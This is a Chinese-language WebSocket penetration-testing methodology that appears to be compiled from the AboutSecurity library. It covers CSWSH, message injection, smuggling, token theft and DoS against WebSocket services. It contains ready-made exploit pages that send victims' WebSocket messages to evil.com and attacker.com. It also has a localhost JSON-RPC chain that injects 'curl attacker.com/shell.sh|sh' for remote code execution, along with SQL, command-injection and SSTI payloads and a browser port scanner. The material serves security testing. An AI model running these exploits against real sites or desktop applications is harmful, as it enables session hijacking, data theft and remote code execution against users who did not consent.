# websocket-attack

> 来源: wgpsec/AboutSecurity (web-method) | 融合进 web 域参考库





# WebSocket 安全测试方法论





WebSocket 提供全双工通信，但安全机制常被忽略——没有同源策略的自动保护、没有 CSRF token 的标准实践。



## Phase 1: 发现 WebSocket 端点



### 1.1 页面分析

在 JS 源码中搜索：

- `new WebSocket(`

- `ws://` 或 `wss://`

- `socket.io`（Socket.IO 库）

- `.onmessage`, `.send(`



### 1.2 网络层识别

- HTTP 101 响应 + `Upgrade: websocket` 头

- 常见路径：`/ws`, `/websocket`, `/socket.io/`, `/cable`（ActionCable）



## Phase 2: Cross-Site WebSocket Hijacking (CSWSH)



WebSocket 握手是 HTTP Upgrade 请求，浏览器会自动携带 Cookie。如果服务端不检查 Origin 头→可跨站劫持。



### 2.1 检测

```

http_request url="http://target/ws" method="GET" headers={"Upgrade":"websocket","Connection":"Upgrade","Sec-WebSocket-Version":"13","Sec-WebSocket-Key":"dGhlIHNhbXBsZSBub25jZQ==","Origin":"https://evil.com"}

```

如果返回 101 → Origin 未校验 → 可劫持。



### 2.2 利用

```html

<script>

var ws = new WebSocket("wss://target.com/ws");

ws.onopen = function() {

    ws.send('{"action":"getProfile"}');

};

ws.onmessage = function(e) {

    // 窃取数据

    fetch("http://evil.com/log?d=" + encodeURIComponent(e.data));

};

</script>

```



## Phase 3: 消息注入



### 3.1 常见注入点

WebSocket 消息通常是 JSON，测试注入：



**SQL 注入**：

```json

{"action":"search","query":"' OR 1=1--"}

```



**命令注入**：

```json

{"action":"ping","host":"127.0.0.1; cat /flag.txt"}

```



**SSTI**：

```json

{"action":"render","template":"{{7*7}}"}

```



### 3.2 认证绕过

某些 WS 实现在握手时认证，但消息级别不检查权限：

- 连接后发送管理员操作消息

- 修改消息中的 user_id/role 字段

- 发送未公开的 action 类型（从 JS 源码中发现）



## Phase 4: 信息泄露



WebSocket 常用于实时功能，可能泄露：

- 其他用户的聊天消息

- 系统通知（含内部信息）

- 实时日志/调试信息

- 管理操作的广播



监听所有消息，不急于发送——有时被动监听就能获取敏感数据。



## Phase 5: Socket.IO 特殊处理



Socket.IO 使用自己的协议格式：

- 消息格式：`42["event_name",{data}]`（4=message, 2=event）

- 先用 HTTP 轮询再升级 WS：`/socket.io/?EIO=4&transport=polling`

- 命名空间：可以连接 `/admin` 命名空间试图访问管理功能



### 5.1 Socket.IO 枚举

- 事件名枚举：搜索 JS 源码查找隐藏事件名



### 5.2 认证缺口

- 握手时有认证但消息级别不检查权限（认证不一致/权限缺口）



## 深入参考



- WebSocket 高级利用技术（CSWSH 深入/SockJS/走私/认证提取） → 下文对应 REF 章节



## Phase 6: 注意事项



- WebSocket 不受浏览器同源策略保护（只靠服务端 Origin 检查）

- 消息内容通常无自动编码/转义，注入风险高

- 长连接意味着可以持续监听和注入





---



## REF: websocket-exploitation



# WebSocket 高级利用技术



> 本文补充 main document 中未深入展开的高级攻击面：CSWSH 深度利用、SockJS 回退传输、WebSocket 走私、DoS、认证令牌提取、竞态条件、原型链污染。



## 识别：高级攻击面枚举



### 自动化指纹与漏洞发现



```bash

# STEWS — WebSocket 自动发现、指纹、已知漏洞检索

git clone https://github.com/PalindromeLabs/STEWS

python3 STEWS-vuln-detect.py -u wss://target.com/ws

```



### SockJS / 备用传输识别



SockJS 在 WebSocket 不可用时自动降级到 HTTP 传输，攻击面更广：



```

目标路径判定

├─ /sockjs/info        → 返回 JSON 含 websocket:true/false

├─ /sockjs/*/xhr       → XHR-streaming 回退

├─ /sockjs/*/jsonp     → JSONP 回退（可能存在回调注入）

└─ /sockjs/*/eventsource → EventSource 回退

```



```bash

# 探测 SockJS 信息端点

curl -s https://target.com/sockjs/info | python3 -m json.tool

```



关键判断：当 `websocket: false` 时服务器禁用了 WS，但 XHR/JSONP 传输仍可利用，且可能缺少 Origin 校验。



### Localhost WebSocket 端口发现



桌面应用常在 `127.0.0.1` 随机端口开放 WebSocket 服务（如游戏启动器、IDE 辅助进程），浏览器不对 loopback 连接执行同源策略。



```javascript

// 浏览器端口扫描（Chromium 可承受约 16000 次失败握手）

async function scanLocalWs(start = 20000, end = 36000) {

  for (let port = start; port <= end; port++) {

    await new Promise((resolve) => {

      const ws = new WebSocket(`ws://127.0.0.1:${port}/`);

      let done = false;

      const fin = () => { if (!done) { done = true; resolve(); } };

      ws.onerror = ws.onclose = fin;

      ws.onopen = () => {

        console.log(`[+] Port ${port} open`);

        ws.close();

        fin();

      };

    });

  }

}

```



## 判断：CSWSH 深入分析



### 利用前提条件决策树



```

CSWSH 是否可行？

├─ 认证方式是否基于 Cookie？

│   ├─ 否 → 不可行（Token/Header 认证无法被浏览器自动携带）

│   └─ 是 ↓

├─ Cookie 的 SameSite 属性？

│   ├─ Strict → 不可行

│   ├─ Lax → 仅在 Cookie 创建后 2 分钟内可行（Chrome 临时窗口）

│   └─ None → 继续 ↓

├─ 服务端是否校验 Origin？

│   ├─ 严格校验 → 需寻找绕过（子域、正则缺陷）

│   └─ 不校验 / 可绕过 → 可行

└─ 目标是否为 localhost？

    └─ 是 → 浏览器不限制 loopback，直接可行

```



### Gorilla WebSocket CheckOrigin 绕过



Go 语言 Gorilla WebSocket 库常见错误配置——`CheckOrigin` 设为始终返回 `true`：



```go

// 服务端漏洞代码特征

var upgrader = websocket.Upgrader{

    CheckOrigin: func(r *http.Request) bool { return true },

}

```



此时任意网页均可发起跨站 WebSocket 连接，无需额外条件。



### 子域 Cookie 继承利用



当目标 Cookie 的 Domain 设置为 `.example.com`，攻击者若控制任意子域（如 `evil.example.com`）：



```

攻击链路

├─ 1. 获取子域控制（子域接管、XSS）

├─ 2. 从子域页面发起 WebSocket 连接到 ws.example.com

├─ 3. 浏览器自动携带 .example.com 的 Cookie

└─ 4. 服务端 Origin 校验通过（同父域）→ 连接建立

```



## 利用：高级攻击手法



### CSWSH 实战：会话数据窃取



完整利用页面——受害者访问后自动连接目标 WS 并外传所有消息：



```html

<script>

var ws = new WebSocket("wss://target.com/ws");

var exfil = [];



ws.onopen = function() {

    // 发送触发数据返回的命令

    ws.send(JSON.stringify({action: "getProfile"}));

    ws.send(JSON.stringify({action: "listTransactions", page: 1}));

};



ws.onmessage = function(e) {

    exfil.push(e.data);

    // 分批外传，避免 URL 长度限制

    if (exfil.length >= 5) {

        navigator.sendBeacon("https://attacker.com/collect",

            JSON.stringify(exfil));

        exfil = [];

    }

};



ws.onclose = function() {

    if (exfil.length > 0) {

        navigator.sendBeacon("https://attacker.com/collect",

            JSON.stringify(exfil));

    }

};

</script>

```



### wsHook 中间人：双向消息拦截



在克隆的目标页面中注入 wsHook，实现对客户端和服务端双向消息的完整拦截：



```javascript

// 引入 wsHook.js (https://github.com/skepticfx/wshook)

// 拦截客户端发送的消息

wsHook.before = function(data, url) {

    fetch("/log/client?m=" + encodeURIComponent(data));

    return data; // 可修改后返回

};



// 拦截服务端返回的消息

wsHook.after = function(messageEvent, url, wsObject) {

    fetch("/log/server?m=" + encodeURIComponent(messageEvent.data));

    return messageEvent; // 可修改后返回

};

```



### WebSocket 走私（Smuggling）



利用反向代理对 Upgrade 请求的处理缺陷，建立虚假 WebSocket 隧道以访问内部 API。



#### 场景一：协议版本欺骗



```

攻击流程

├─ 1. 客户端发送 Upgrade 请求，故意使用错误的 Sec-WebSocket-Version

├─ 2. 反向代理不校验版本，认为合法并转发

├─ 3. 后端返回 426（版本不正确）

├─ 4. 反向代理忽略 426 状态码，认为 WS 连接已建立

├─ 5. 代理维持 TCP 连接 → 客户端可直接访问内部 REST API

└─ 影响：Varnish、Envoy<=1.8.0

```



#### 场景二：通过 SSRF 伪造 101 响应



```

攻击流程

├─ 1. 客户端向公开的 REST API 发送含 Upgrade: websocket 头的 POST 请求

├─ 2. 后端 API 触发 SSRF，请求攻击者控制的服务器

├─ 3. 攻击者服务器返回 HTTP 101

├─ 4. NGINX 看到 101 响应 → 认为 WS 隧道已建立

├─ 5. 代理维持连接 → 客户端通过该隧道访问内部 API

└─ 前提：需要外部 SSRF 漏洞

```



受影响代理判断：



```

代理默认转发 Upgrade/Connection 头？

├─ HAProxy     → 是（默认易受攻击）

├─ Traefik     → 是

├─ Nuster      → 是

├─ NGINX       → 否（但不安全配置可导致）

├─ Apache      → 否（但不安全配置可导致）

├─ AWS ALB/CLB → 否（但不安全配置可导致）

└─ Envoy       → <=1.8.0 易受攻击

```



测试工具：



```bash

# H2C Smuggling 检测（可复用于 WebSocket 走私场景）

git clone https://github.com/BishopFox/h2csmuggler

python3 h2csmuggler.py -x https://target.com/ --test



# WebSocket 走私实验环境

git clone https://github.com/0ang3el/websocket-smuggle.git

```



### 认证令牌提取



WebSocket 消息中常携带认证令牌，结合 CSWSH 可窃取：



```

令牌提取判断

├─ 连接握手阶段

│   ├─ URL 参数中的 token: ws://target/ws?token=xxx

│   └─ Cookie 中的 session ID（CSWSH 自动携带）

├─ 消息交互阶段

│   ├─ 登录成功后服务端推送的 JWT/session token

│   ├─ 心跳消息中携带的刷新令牌

│   └─ 事件订阅响应中的 API key

└─ 利用方式

    ├─ CSWSH 页面被动监听所有消息

    └─ 过滤含 token/key/jwt/session 关键字的消息

```



### Localhost JSON-RPC 链式利用



桌面应用暴露的本地 WebSocket JSON-RPC 接口可链式利用实现 RCE：



```

链式攻击模型

├─ 1. 端口扫描发现本地 WS 服务

├─ 2. 捕获合法 RPC 协议格式

├─ 3. 调用资源创建方法（如 createModpack）→ 获取资源 ID

├─ 4. 调用执行方法（如 launchInstance）→ 注入命令参数

└─ 5. 实现 RCE

```



```javascript

// 利用示例：通过 JSON-RPC 注入 JVM 参数

const ws = new WebSocket("ws://127.0.0.1:FOUND_PORT/api/v1/websocket");

ws.onopen = () => {

    // Step 1: 创建资源

    ws.send(JSON.stringify({

        type: "method",

        name: "createModpack",

        args: [{name: "exploit-pack"}]

    }));

};

ws.onmessage = (e) => {

    const resp = JSON.parse(e.data);

    if (resp.guid) {

        // Step 2: 使用获取的 GUID 启动并注入参数

        ws.send(JSON.stringify({

            type: "method",

            name: "minecraftTaskLaunchInstance",

            args: [{

                InstanceGuid: resp.guid,

                AdditionalJavaArguments: '-XX:OnOutOfMemoryError="curl attacker.com/shell.sh|sh"'

            }]

        }));

    }

};

```



### DoS：畸形帧 Ping of Death



构造声明超大 payload 但不发送实际数据的 WS 帧，迫使服务端预分配巨量内存：



```

DoS 攻击原理

├─ WS 帧头声明 payload length ≈ Integer.MAX_VALUE

├─ 服务端信任帧头，预分配对应大小的缓冲区

├─ 实际不发送数据体

└─ 结果：服务端 OutOfMemoryError → 服务崩溃

```



影响范围：信任帧头长度字段并预分配缓冲区的 WS 服务端实现。此为未认证远程 DoS。



### Socket.IO 原型链污染



通过 Socket.IO 事件注入 `__proto__` 属性，污染 Node.js Express 服务端原型链：



```json

{"__proto__":{"initialPacket":"Polluted"}}

```



```

检测流程

├─ 1. 通过 Socket.IO 发送含 __proto__ 的消息

├─ 2. 观察后续响应是否包含 "Polluted" 字符串

├─ 3. 若包含 → 原型链已被污染

└─ 4. 进一步寻找可利用的 gadget（参考 Node.js 原型链污染利用链）

```



### WebSocket 竞态条件



利用多连接并行发送实现竞态攻击（双重消费、令牌重用、状态不同步）：



```

竞态条件利用

├─ 默认单连接批量发送 → 吞吐量高但无竞态效果

├─ 使用多线程引擎 → 多 WS 连接并行发送

└─ 典型场景

    ├─ 余额双重消费

    ├─ 优惠券/令牌重复使用

    └─ 状态机不同步

```



## 验证：确认漏洞有效性



### CSWSH 验证清单



```

验证步骤

├─ 1. 在不同域的页面发起 WebSocket 连接

├─ 2. 确认 Cookie 被自动携带（浏览器 DevTools → Network）

├─ 3. 确认连接成功建立（101 响应）

├─ 4. 发送读取操作消息，确认返回受害者数据

├─ 5. 发送写入操作消息，确认操作以受害者身份执行

└─ 6. 验证数据可外传到攻击者服务器

```



### WebSocket 走私验证



```

验证步骤

├─ 1. 发送畸形 Upgrade 请求

├─ 2. 确认代理未断开连接

├─ 3. 通过该连接发送内部 API 请求（如 GET /admin/status）

├─ 4. 确认返回内部 API 的响应数据

└─ 5. 对比直接请求内部 API（应返回 403/404）

```



### 通用工具验证



```bash

# websocat — 命令行 WebSocket 客户端

websocat --insecure wss://target.com/ws -v



# websocat 作为代理中继

websocat -E --insecure --text ws-listen:0.0.0.0:8000 wss://target.com/ws -v



# Burp Suite 扩展

# socketsleuth — WS 历史、拦截规则、Intruder 支持

# WSSiP — WebSocket/Socket.IO 代理，支持自定义消息

# Backslash Powered Scanner — 已支持 WS 消息 Fuzz

# WebSocket Turbo Intruder — 高速 WS Fuzz + HTTP 中间件桥接

```



### HTTP 中间件桥接验证



将 WS 后端封装为 HTTP 端点，让任何 HTTP 扫描器都能测试 WS：



```python

# Turbo Intruder HTTP 中间件脚本

def create_connection(upgrade_request):

    connection = websocket_connection.create(upgrade_request)

    return connection



def handle_incoming_message(websocket_message):

    results_table.add(websocket_message)

```



发送 HTTP 请求，body 自动作为 WS 消息转发：



```http

POST /proxy?url=https%3A%2F%2Ftarget.com/ws HTTP/1.1

Host: 127.0.0.1:9000

Content-Length: 16



{"message":"hi"}

```

